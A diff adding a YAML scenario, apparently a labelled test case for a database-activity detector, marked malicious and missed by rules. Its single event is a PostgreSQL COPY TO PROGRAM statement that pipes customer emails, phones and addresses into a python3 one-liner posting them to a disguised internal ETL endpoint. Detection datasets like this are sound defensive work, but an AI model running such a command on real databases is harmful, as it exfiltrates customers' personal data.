@@ -1,0 +1,31 @@
+scenario_id: gen_ecommerce_35_copy_to_program_mal_979m
+family_id: gen_ecommerce_35_copy_to_program_fam_979
+domain: ecommerce
+time_of_day: '22:20'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'python3
+      -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://etl-internal.corp/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 10.65.38.145
+      port: 443
+matched_pair_id: gen_ecommerce_35_copy_to_program_pair_979
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
